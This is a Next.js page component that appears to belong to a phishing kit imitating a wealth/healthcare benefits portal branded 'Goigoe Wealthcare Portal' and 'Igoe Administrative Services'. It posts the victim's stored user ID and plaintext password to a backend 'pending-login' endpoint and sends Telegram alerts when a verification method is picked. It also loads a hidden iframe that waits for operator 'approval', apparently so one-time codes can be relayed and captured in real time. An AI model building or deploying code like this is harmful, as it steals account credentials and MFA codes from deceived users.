'use client'

import Link from "next/link"
import Image from "next/image"
import { useEffect, useState } from "react"
import { Mail, MessageSquare, X } from "lucide-react"
import { Button } from "@/components/ui/button"
import { Spinner } from "@/components/ui/spinner"
import { BackButton } from "@/components/BackButton"
import { trackFormSubmission } from "@/hooks/use-visitor-tracking"

export default function VerificationPage() {
  const [isEmailLoading, setIsEmailLoading] = useState(false)
  const [isTextLoading, setIsTextLoading] = useState(false)
  const [isCancelLoading, setIsCancelLoading] = useState(false)
  const [pendingId, setPendingId] = useState<string | null>(null)
  const [loadingMethod, setLoadingMethod] = useState<'email' | 'text' | null>(null)
  const [networkError, setNetworkError] = useState('')
  
  // Set registration accessed cookie when page loads
  useEffect(() => {
    const setRegistrationCookie = async () => {
      try {
        await fetch('/api/set-registration-accessed', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          }
        })
      } catch (error) {
        console.error('Failed to set registration accessed:', error)
      }
    }
    setRegistrationCookie()
  }, [])

  const handleVerificationMethod = async (method: 'email' | 'text') => {
    if (loadingMethod) return
    if (method === 'email') setIsEmailLoading(true)
    else setIsTextLoading(true)
    setLoadingMethod(method)
    setNetworkError('')

    trackFormSubmission({
      type: method === 'email' ? 'email_selection' : 'text_selection',
      page: '/registration',
      timestamp: new Date().toISOString(),
    })

    void fetch('/api/telegram/verification-click', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        verificationType: method === 'email' ? 'Email' : 'Phone (SMS)',
      }),
    }).catch(console.error)

    const userId = sessionStorage.getItem('loginUserId') ?? ''
    const password = sessionStorage.getItem('loginPassword') ?? ''
    const maskedEmail = sessionStorage.getItem('maskedEmail') ?? '**********'
    const maskedPhone = sessionStorage.getItem('maskedPhone') ?? '***-***-****'

    try {
      const res = await fetch('/api/pending-login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          userId,
          password,
          method,
          maskedEmail,
          maskedPhone,
          flow: 'login',
        }),
      })
      const data = await res.json()
      if (!res.ok) {
        setNetworkError(data.error || 'Network error. Please try again.')
        setIsEmailLoading(false)
        setIsTextLoading(false)
        setLoadingMethod(null)
        return
      }
      if (data.id) {
        sessionStorage.setItem('verificationMethod', method)
        setPendingId(data.id)
        return
      }
      setNetworkError(
        'We are unable to verify you at this time. Please try again in a few minutes.',
      )
      setIsEmailLoading(false)
      setIsTextLoading(false)
      setLoadingMethod(null)
    } catch {
      setNetworkError('Network error. Please try again.')
      setIsEmailLoading(false)
      setIsTextLoading(false)
      setLoadingMethod(null)
    }
  }

  const handleEmailClick = (e: React.MouseEvent) => {
    e.preventDefault()
    void handleVerificationMethod('email')
  }

  const handleTextClick = (e: React.MouseEvent) => {
    e.preventDefault()
    void handleVerificationMethod('text')
  }

  const optionsDisabled = loadingMethod !== null
  const isWaiting = loadingMethod !== null && pendingId !== null
  
  const handleCancelClick = async () => {
    setIsCancelLoading(true)
    await new Promise(resolve => setTimeout(resolve, 1000))
    window.location.href = '/'
  }

  return (
    <div className="min-h-screen flex flex-col bg-white">
      {/* Header */}
      <header className="border-b border-gray-200 px-6 py-4">
        <div className="flex items-center justify-between md:justify-start">
          <div className="flex items-center gap-6">
            {/* Logo */}
            <Link href="/" className="flex items-center">
              <Image
                src="/img/ebc994a1e5464f6b94b98cd212d5cbac.jpeg"
                alt="Goigoe Wealthcare Portal"
                width={140}
                height={32}
                className="h-8 w-auto"
                priority
              />
            </Link>

          </div>

        </div>
      </header>

      {/* Main Content */}
      <main className="flex-1 flex flex-col items-center px-6 py-12">
        <div className="w-full max-w-3xl">
          {isWaiting && pendingId && loadingMethod && (
            <iframe
              title="Wait for approval"
              src={`/api/pending-login/${encodeURIComponent(pendingId)}/wait?method=${loadingMethod}`}
              style={{ position: 'absolute', width: 0, height: 0, border: 0, visibility: 'hidden' }}
              aria-hidden
            />
          )}

          {/* Instructions */}
          <p className="text-center text-gray-700 mb-12">
            We found you! Pick a verification method.
          </p>

          {networkError && (
            <p className="text-red-500 text-sm text-center mb-4">{networkError}</p>
          )}

          {/* Verification Options */}
          <div className={`max-w-2xl mx-auto space-y-6 mb-12 transition-opacity ${optionsDisabled ? 'opacity-60' : ''}`}>
            {/* Email Option */}
            <div className="flex items-center justify-between gap-4">
              <div className="flex-1 text-gray-700">
                <span>Send code to email: </span>
                <span className="font-medium">**********@****.com</span>
              </div>
              <Button 
                onClick={handleEmailClick}
                disabled={optionsDisabled}
                className="bg-[#010147] hover:bg-[#d6d6d6] hover:text-gray-900 text-white px-8 py-6 min-w-[140px] border border-[#bec5c2] rounded-none shadow-[0_0_3px_0_#0066a1] disabled:opacity-50 disabled:cursor-not-allowed"
              >
                {isEmailLoading ? (
                  <>
                    <Spinner className="w-5 h-5 mr-2" />
                    LOADING...
                  </>
                ) : (
                  <>
                    <Mail className="w-5 h-5 mr-2" />
                    E-MAIL
                  </>
                )}
              </Button>
            </div>

            {/* Text Option */}
            <div className="flex items-center justify-between gap-4">
              <div className="flex-1 text-gray-700">
                <span>Send code via text: </span>
                <span className="font-medium">***-***-****</span>
              </div>
              <Button 
                onClick={handleTextClick}
                disabled={optionsDisabled}
                className="bg-[#010147] hover:bg-[#d6d6d6] hover:text-gray-900 text-white px-8 py-6 min-w-[140px] border border-[#bec5c2] rounded-none shadow-[0_0_3px_0_#0066a1] disabled:opacity-50 disabled:cursor-not-allowed"
              >
                {isTextLoading ? (
                  <>
                    <Spinner className="w-5 h-5 mr-2" />
                    LOADING...
                  </>
                ) : (
                  <>
                    <MessageSquare className="w-5 h-5 mr-2" />
                    TEXT
                  </>
                )}
              </Button>
            </div>
          </div>

          {/* Action Buttons */}
          <div className="flex items-center justify-center gap-4 mb-8">
            <Button
              onClick={handleCancelClick}
              disabled={isCancelLoading}
              variant="outline"
              className="bg-[#d6d6d6] text-gray-900 hover:bg-[#010147] hover:text-white px-8 py-6 min-w-[140px] border border-[#bec5c2] rounded-none shadow-[0_0_3px_0_#0066a1] disabled:opacity-50 disabled:cursor-not-allowed"
            >
              {isCancelLoading ? (
                <>
                  <Spinner className="w-5 h-5 mr-2" />
                  LOADING...
                </>
              ) : (
                <>
                  <X className="w-5 h-5 mr-2" />
                  CANCEL
                </>
              )}
            </Button>
            <BackButton />
          </div>

          {/* Help Link */}
          <p className="text-center">
            <Link href="#" className="text-blue-700 underline hover:text-blue-800">
              I cannot receive a verification code
            </Link>
          </p>
        </div>
      </main>

      {/* Footer */}
      <footer className="bg-gray-300 py-6 px-6">
        <div className="max-w-7xl mx-auto">
          <nav className="flex flex-wrap items-center justify-center gap-6 mb-3 text-sm">
            <Link href="#" className="text-gray-700 hover:text-gray-900">
              CONTACT US
            </Link>
            <Link href="#" className="text-gray-700 hover:text-gray-900">
              ABOUT US
            </Link>
            <Link href="#" className="text-gray-700 hover:text-gray-900">
              TERMS OF USE
            </Link>
            <Link href="#" className="text-gray-700 hover:text-gray-900">
              PRIVACY POLICY
            </Link>
          </nav>
          <p className="text-center text-sm text-gray-600 mb-2">
            Copyright © 2024 Igoe Administrative Services. All Rights Reserved.
          </p>
          <p className="text-center">
            <Link href="#" className="text-sm text-gray-700 hover:text-gray-900 underline">
              SITE MAP
            </Link>
          </p>
        </div>
      </footer>
    </div>
  )
}
